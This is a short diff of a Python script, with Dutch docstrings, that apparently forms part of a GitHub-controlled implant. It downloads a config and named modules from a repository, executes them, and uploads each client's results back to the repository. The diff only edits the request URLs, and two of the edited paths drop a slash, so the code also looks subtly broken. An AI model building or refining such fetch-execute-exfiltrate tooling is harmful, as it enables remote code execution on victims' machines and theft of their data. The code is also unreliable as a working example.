@@ -25,7 +25,7 @@ HEADERS = {
 def fetch_config():
     """Downloadt het configuratiebestand van de GitHub-repo."""
     try:
-        url = f"{GITHUB_REPO}/contents/config/config.json"
+        url = f"{GITHUB_REPO}/config/config.json"
         response = requests.get(url, headers=HEADERS)
         if response.status_code == 200:
             content = response.json()["content"]
@@ -42,7 +42,7 @@ def fetch_config():
 def fetch_module(module_name):
     """Downloadt de module van GitHub."""
     try:
-        url = f"{GITHUB_REPO}/contents/modules/{module_name}.py"
+        url = f"{GITHUB_REPO}modules/{module_name}.py"
         response = requests.get(url, headers=HEADERS)
         if response.status_code == 200:
             encoded_content = response.json()["content"]
@@ -74,7 +74,7 @@ def execute_module(module_path):
 def send_results(data):
     """Uploadt resultaten van een module naar de GitHub-repository."""
     file_path = f"data/{CLIENT_ID}.json"
-    url = f"{GITHUB_REPO}/contents/{file_path}"
+    url = f"{GITHUB_REPO}{file_path}"
     try:
         response = requests.get(url, headers=HEADERS)
         sha = response.json()["sha"] if response.status_code == 200 else None
